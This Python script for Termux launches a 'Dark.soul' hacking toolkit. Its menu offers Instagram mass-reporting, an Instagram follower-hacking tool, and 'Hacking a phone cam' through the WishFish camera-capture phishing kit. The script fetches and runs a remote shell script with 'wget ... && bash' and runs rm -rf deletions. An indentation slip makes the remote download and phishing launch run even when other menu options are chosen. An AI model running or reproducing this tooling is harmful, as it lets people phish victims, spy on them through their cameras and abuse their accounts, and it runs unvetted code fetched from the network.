from os import *
from os import system,remove
import os
from sys import *

from time import *

system('pip install requests')
import requests,uuid,secrets

from time import sleep

####                 colors

#cp $PREFIX/bin/ngrok ~/

R='\033[1;31m'

G='\033[1;32m'

Y='\033[1;33m'

C='\033[1;36m'

W='\033[1;37m'

#12###     banne

system('termux-setup-storage -y')

system('clear')

system('termux-open https://instagram.com/darkwsoul?igshid=4amhid3b3tsu')

#

system('clear')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMKlONMMMMMMXklNMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMX   .   ..   WMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMM0           .XMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMKkkONMMMMMN.\033[1;31m  :k;  .xd  \033[1;33m.WMMMMMMMMM')

print('\033[1;33mMMMMMMMMMN,     cWMMMN             .NMMMMMMMMM')

print('\033[1;33mMMMMMMMMMd       xMMMMk.          .0MMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMx.     xMMMMMc          0MMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMO    .WMMMMx           .XMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMo   .KMMMM0             .OMMMmMMMMM')

print('\033[1;33mMMMMMMMMMMW.   kMMMMW.              oMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMx   ;MMMMMk               .WMMMMMMMM')

print('\033[1;33mMMMMMMMMMMl   oMMMMM;                OMMMMMMMM')

print('\033[1;33mMMMMMMMMMMx   cMMMMM.                xMMMMMMMM')

print('\033[1;33mMMMMMMMMMMM:   oWMMMo               .XMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMx.  .ckKNc             .0MMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMWx,                   .dMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMW0xl:;;;::ccloxONMMMMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWMMMMMMMMMM')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXOxxkXMNKOO')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkdoc;okkx')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXXooxx')

print('\033[1;33mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMlxl')

print(R + '''
______           _    _____             _
|  _  \         | |  /  ___|           | |
| | | |__ _ _ __| | _\ `--.  ___  _   _| |
| | | / _` | '__| |/ /`--. \/ _ \| | | | |
| |/ / (_| | |  |   </\__/ / (_) | |_| | |
|___/ \__,_|_|  |_|\_\____/ \___/ \__,_|_|

                                          ''')
print(" ")

print ( G +"["+ R +"1" + G +"]"+ W +"=="+ G +"["+ Y +"Edit bash script"+ G +"]")

system('sleep 0.1')

print ( G +"["+ R +"2" + G +"]"+ W +"=="+ G +"["+ Y +"Instagram Report"+ G +"]")

system('sleep 0.1')

print ( G +"["+ R +"3" + G +"]"+ W +"=="+ G +"["+ Y +"AHT.Hacker Download"+ G +"]")

system('sleep 0.1')

print ( G +"["+ R +"4" + G +"]"+ W +"=="+ G +"["+ Y +"Instagram fowllers"+ G +"]")

system('sleep 0.1')

print ( G +"["+ R +"5" + G +"]"+ W +"=="+ G +"["+ Y +"Hacking a phone came"+ G +"]")

system('sleep 0.1')

print ( G +"["+ R +"0" + G +"]"+ W +"=="+ G +"["+ Y +"Exit program"+ G +"]")

print(" ")

droid=str(input(R +"              ●~"+ G +"Enter Number "+ R +"~》 "+ G))

if  droid=="0":

    system('clear')

    print(Y +"Thank you very much for using the Dark.soul tool I wish you a happy day :)")

    print(R +"*"*70)

    exit()

if droid == "1":

    system('clear')

    print (G +"            ^_^ ...... Thank You Down")

    input (G +"Enter To OpEn... ")

    system ('clear')
    system('bash OwO.sh')
    system('python3 Darksoul/Dark.py')

if droid == "2":

    system('clear')

    system('git clone https://github.com/MrAli-s/Report-Instagram-')

    input (R +"Pleace Enter to Open... ")

    system('python3 Report-Instagram-/Report.py')

    exit()





if droid == "3":

  system('clear')
  system('bash Jo.sh')

if droid == "4":


  system('git clone https://github.com/nandy121/inshackle.git')

  system('clear')

  print('\033[1;36m')

  print('\033[1;36m   _.---.._             _.---...__')

  print("\033[1;36m.-'   /\   \          .'  /\     /")

  print('\033[1;36m`\033[1;31m.   (  )   \        /   (  )   /')

  print("\033[1;36m  `.  \/   .'\      /`.   \/  .' ")

  print('\033[1;36m    ``---''     )    (   ``--- ')

  print("\033[1;36m            .';.--.;`.")

  print("\033[1;36m          .' /_...._\ `.")

  print('''\033[1;36m        .'   `.a  a.'   `.''')

  print('\033[1;36m       (        \/        )  ')

  print("\033[1;36m        `.___..-'`-..___.' ")

  print('\033[1;36m           \          / ')

  print('\033[1;36m            `-.____.-')

  input (G +"Pleace Enter to Open... ")

  system('bash inshackle/inshackle.sh')

  exit()



if droid == "5":

  system('clear')

print (Y +"    {+\+\+\+ Install Now Ngrok +/+/+/+}")

system('sleep 1')

system('pkg install wget -y')


#system('rm -rf 01010cam saved.ip.txt README.md extract.sh fix-ar-ngrok ip.php index2.html index.php ip.php template.php LICENSE template.php saycheese.html ngrok jmaxopcam.sh post.php ~/01010cam/')

system('rm -rf  saved.ip.txt getid Custom.html LICENSE README.md captured copy.sh index.php index2.html ip.php post.php ngrok template.php wishfish.html wishfish.sh ~/WishFish/')
system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
system('clear')
system('git clone https://github.com/kinghacker0/WishFish.git')
system('clear')
print('''\033[1;32m        .---.''')
print('''\033[1;32m        |[\033[1;31mX\033[1;32m]|''')
print('''\033[1;32m _.==._.""""".___n__''')
print('''\033[1;32md __ ___.-""-. _____b''')
print('''\033[1;32m|[__]  /.""".\\\ _   |''')
print('''\033[1;32m|     // /""\ \\\_)  |''')
print('''\033[1;32m|     \\\ \__/ //    |''')
print('''\033[1;32m|      \`.__.`/     |''')
print('''\033[1;32m\=======`-..-`======/''')
print('''\033[1;32m `-----------------` ''')
input (Y + "Pleace Enter to OpEn...")
system('cp $PREFIX/bin/ngrok ~/WishFish')
system('mv WishFish ~')
system('mv fix-ar-ngrok ~')
system('mv ~/WishFish/Custom.html ~/WishFish/LICENSE ~/WishFish/README.md ~/WishFish/captured ~/WishFish/copy.sh ~/WishFish/index.php ~/WishFish/index2.html ~/WishFish/ip.php ~/WishFish/post.php ~/WishFish/ngrok ~/WishFish/template.php ~/WishFish/wishfish.html ~/WishFish/wishfish.sh ~/Dark.soul/')
system('rm -rf ~/WishFish')
system('bash wishfish.sh')
exit()
